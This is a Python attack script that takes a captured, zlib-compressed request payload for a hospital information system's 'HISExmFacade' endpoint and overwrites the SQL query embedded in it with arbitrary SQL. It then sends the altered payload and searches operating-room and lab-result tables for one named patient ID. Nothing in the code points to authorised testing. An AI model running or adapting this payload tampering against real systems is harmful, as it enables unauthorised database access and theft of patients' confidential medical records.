from his_client_final import HISClient
import requests
import zlib

class DeepSearcher(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-]. SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = DeepSearcher()
target = '003617083J'
short_target = '3617083' # Try without leading zeros or suffix

print(f"1. Searching CPOE.OR_SIGN_IN for {target}...")
# Try exact match on common ID fields
sql_cpoe = f"SELECT * FROM CPOE.OR_SIGN_IN WHERE OR_PAT_NO = '{target}' OR OR_H_NO = '{target}'"
res_cpoe = searcher.execute_sql(sql_cpoe)
if res_cpoe and "<NewDataSet>" in res_cpoe:
    print(res_cpoe[:1000])
else:
    print("[-] No exact match in CPOE.")

print(f"\n2. Searching OPDUSR.PAT_RESULTH for ID like '%{short_target}%'...")
sql_lab = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID LIKE '%{short_target}%'"
res_lab = searcher.execute_sql(sql_lab)
if res_lab and "<NewDataSet>" in res_lab:
    print(res_lab[:1000])
else:
    print("[-] No fuzzy match in PAT_RESULTH.")

print(f"\n3. Searching OPDUSR.PAT_RESULTH for AltID like '%{short_target}%'...")
sql_lab_alt = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ALTID LIKE '%{short_target}%'"
res_lab_alt = searcher.execute_sql(sql_lab_alt)
if res_lab_alt and "<NewDataSet>" in res_lab_alt:
     print(res_lab_alt[:1000])
else:
     print("[-] No fuzzy match in PAT_RESULTH AltID.")
